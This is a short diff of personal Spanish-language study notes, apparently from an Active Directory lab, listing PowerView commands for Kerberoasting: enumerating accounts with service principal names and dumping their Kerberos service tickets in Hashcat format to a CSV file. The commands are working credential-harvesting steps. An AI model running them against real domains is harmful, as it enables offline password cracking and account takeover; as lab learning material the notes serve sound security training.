@@ -20,4 +20,10 @@ traer todos los users spn:
 Get-DomainUser * -spn | select samaccountname
 
 traer el ticket de un usuario en especial:
-Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat    (esto no tre el ticket para copiar y pegar)
+
+traer todos los tickets a un csv
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+
+guardar el ticket de un usuario en especial:
+Get-DomainUser -Identity <user> | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
